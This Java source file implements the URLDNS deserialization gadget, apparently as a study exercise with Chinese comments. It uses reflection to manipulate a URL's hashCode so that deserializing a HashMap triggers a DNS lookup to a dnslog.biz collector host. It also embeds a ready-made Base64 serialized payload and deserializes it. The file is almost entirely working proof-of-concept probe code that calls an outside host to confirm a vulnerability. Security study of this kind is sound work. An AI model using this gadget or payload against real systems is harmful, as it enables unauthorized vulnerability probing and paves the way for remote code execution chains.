package com.example;


import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        HashMap<URL,Integer> hashMap=new HashMap<URL,Integer>(); //定义一个HashMap对象
        URL url=new URL("http://6eaa3da6.log.dnslog.biz"); //定义一个URL对象
        Class c=url.getClass();
        Field hashcodefield=c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1); // 更改hashcode的值为非-1，防止在put时就发送dns请求
        hashMap.put(url,1);
        hashcodefield.set(url,-1); //将hashcode的值改回-1，这样才能使反序列化后能够触发getHostAddress
//        serialize(hashMap);
//        deserialize();
//        System.out.println(serializeBase(hashMap));
        String ser="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAFzZlYWEzZGE2LmxvZy5kbnNsb2cuYml6dAAAcQB+AAV0AARodHRwcHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg=";
        deserialize(ser);
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static String serializeBase(Object obj) throws Exception{
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));
        return ois.readObject();
    }
    public static Object deserialize(String ser) throws Exception {
        byte[] base64decodeBytes= Base64.getDecoder().decode(ser);
        ByteArrayInputStream data=new ByteArrayInputStream(base64decodeBytes);
        ObjectInputStream ois=new ObjectInputStream(data);
        Object obj= ois.readObject();
        System.out.println(obj);
        return obj;
    }
}
